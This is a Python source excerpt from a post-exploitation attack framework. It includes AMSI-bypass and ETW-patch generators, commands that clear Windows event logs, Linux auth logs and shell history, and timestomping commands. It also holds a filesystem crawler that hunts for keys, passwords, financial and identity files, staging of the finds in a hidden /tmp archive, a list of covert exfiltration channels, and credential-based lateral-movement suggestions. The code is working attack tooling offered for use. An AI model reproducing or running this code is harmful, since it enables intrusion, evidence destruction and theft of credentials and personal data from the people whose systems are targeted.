    def generate_amsi_bypass(self, technique: str = "reflection") -> str:
        """Generate AMSI bypass code."""
        return self.AMSI_BYPASSES.get(technique, self.AMSI_BYPASSES["reflection"])

    def generate_etw_patch(self) -> str:
        """Generate ETW patching code."""
        return self.ETW_PATCH

    def generate_log_cleanup(self) -> List[str]:
        """Generate log cleanup commands."""
        if self.os_type == OperatingSystem.WINDOWS:
            return [
                'wevtutil cl Security',
                'wevtutil cl System',
                'wevtutil cl Application',
                'wevtutil cl "Windows PowerShell"',
                'wevtutil cl Microsoft-Windows-PowerShell/Operational',
                'del /f /q %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\*',
            ]
        else:
            return [
                'echo "" > /var/log/auth.log',
                'echo "" > /var/log/syslog',
                'echo "" > /var/log/messages',
                'echo "" > ~/.bash_history',
                'history -c',
                'cat /dev/null > /var/log/wtmp',
                'cat /dev/null > /var/log/lastlog',
            ]

    def timestomp_commands(self, target_file: str, reference_file: str) -> List[str]:
        """Generate timestomping commands."""
        if self.os_type == OperatingSystem.WINDOWS:
            return [
                f'powershell -c "(Get-Item \'{target_file}\').CreationTime = (Get-Item \'{reference_file}\').CreationTime"',
                f'powershell -c "(Get-Item \'{target_file}\').LastWriteTime = (Get-Item \'{reference_file}\').LastWriteTime"',
                f'powershell -c "(Get-Item \'{target_file}\').LastAccessTime = (Get-Item \'{reference_file}\').LastAccessTime"',
            ]
        else:
            return [
                f'touch -r {reference_file} {target_file}',
            ]


class DataExfiltration:
    """
    Data discovery and exfiltration.
    """

    # Sensitive file patterns
    SENSITIVE_PATTERNS = {
        "credentials": [
            r"password", r"passwd", r"credential", r"secret",
            r"\.pem$", r"\.key$", r"\.pfx$", r"id_rsa",
        ],
        "financial": [
            r"credit", r"card", r"bank", r"invoice", r"payment",
            r"\.xlsx?$", r"\.csv$",
        ],
        "personal": [
            r"ssn", r"social.?security", r"dob", r"birth",
            r"passport", r"license", r"medical",
        ],
        "code": [
            r"\.env$", r"config\.", r"setting", r"\.git",
            r"\.sql$", r"backup",
        ],
    }

    def __init__(self):
        self.discovered_files: List[Dict] = []

    def discover_sensitive(self, start_path: str = "/",
                          max_size_mb: int = 10) -> List[Dict]:
        """Discover sensitive files."""
        files = []
        max_size = max_size_mb * 1024 * 1024

        try:
            for root, dirs, filenames in os.walk(start_path):
                # Skip system directories
                dirs[:] = [d for d in dirs if d not in [
                    "proc", "sys", "dev", "run", "boot",
                    "Windows", "Program Files"
                ]]

                for filename in filenames:
                    filepath = os.path.join(root, filename)

                    try:
                        stat = os.stat(filepath)
                        if stat.st_size > max_size:
                            continue

                        for category, patterns in self.SENSITIVE_PATTERNS.items():
                            for pattern in patterns:
                                if re.search(pattern, filepath, re.IGNORECASE):
                                    files.append({
                                        "path": filepath,
                                        "category": category,
                                        "size": stat.st_size,
                                        "modified": stat.st_mtime,
                                    })
                                    break
                    except (PermissionError, OSError):
                        pass
        except Exception:
            pass

        self.discovered_files = files
        return files

    def stage_for_exfil(self, files: List[str], staging_dir: str = "/tmp/.cache") -> str:
        """Stage files for exfiltration."""
        import tarfile
        import gzip

        os.makedirs(staging_dir, exist_ok=True)
        archive_path = os.path.join(staging_dir, f".data_{int(time.time())}.tar.gz")

        try:
            with tarfile.open(archive_path, "w:gz") as tar:
                for filepath in files:
                    try:
                        tar.add(filepath, arcname=os.path.basename(filepath))
                    except Exception:
                        pass
        except Exception:
            pass

        return archive_path

    def exfil_methods(self) -> Dict[str, str]:
        """Return available exfiltration methods."""
        return {
            "dns": "Split data into DNS queries to controlled domain",
            "http": "POST data to controlled web server",
            "https": "Encrypted POST to controlled server",
            "icmp": "Encode data in ICMP echo requests",
            "dns_over_https": "Use DoH for covert channel",
            "cloud": "Upload to cloud storage (S3, Azure Blob)",
            "email": "Send via SMTP to controlled mailbox",
        }


# Main interface
class PostExploitationFramework:
    """
    Main post-exploitation framework orchestrator.
    """

    def __init__(self, os_type: OperatingSystem = OperatingSystem.LINUX):
        self.os_type = os_type
        self.harvester = CredentialHarvester(os_type)
        self.privesc = PrivilegeEscalation(os_type)
        self.persistence = PersistenceInstaller(os_type)
        self.evasion = DefenseEvasion(os_type)
        self.exfil = DataExfiltration()

    def full_enumeration(self) -> Dict:
        """Run full post-exploitation enumeration."""
        results = {
            "credentials": [],
            "privesc_opportunities": [],
            "sensitive_files": [],
        }

        # Credential harvesting
        results["credentials"] = [
            {
                "type": c.type.value,
                "username": c.username,
                "source": c.source,
                "info": c.additional_info,
            }
            for c in self.harvester.harvest_all()
        ]

        # Privilege escalation
        results["privesc_opportunities"] = [
            {
                "vector": p.vector.value,
                "description": p.description,
                "target": p.target,
                "exploit": p.exploit_method,
                "probability": p.success_probability,
            }
            for p in self.privesc.enumerate_all()
        ]

        # Sensitive file discovery
        results["sensitive_files"] = self.exfil.discover_sensitive()[:50]

        return results

    def get_attack_suggestions(self) -> List[Dict]:
        """Get prioritized attack suggestions based on findings."""
        suggestions = []

        # Based on privesc opportunities
        for opp in self.privesc.opportunities:
            if opp.success_probability >= 0.8:
                suggestions.append({
                    "action": "privilege_escalation",
                    "technique": opp.vector.value,
                    "target": opp.target,
                    "method": opp.exploit_method,
                    "priority": "HIGH",
                })

        # Based on credentials
        for cred in self.harvester.credentials:
            if cred.type in [CredentialType.SSH_KEY, CredentialType.NTLM_HASH]:
                suggestions.append({
                    "action": "lateral_movement",
                    "technique": "credential_reuse",
                    "credential": cred.username,
                    "priority": "HIGH",
                })

        return sorted(suggestions, key=lambda x: x["priority"])
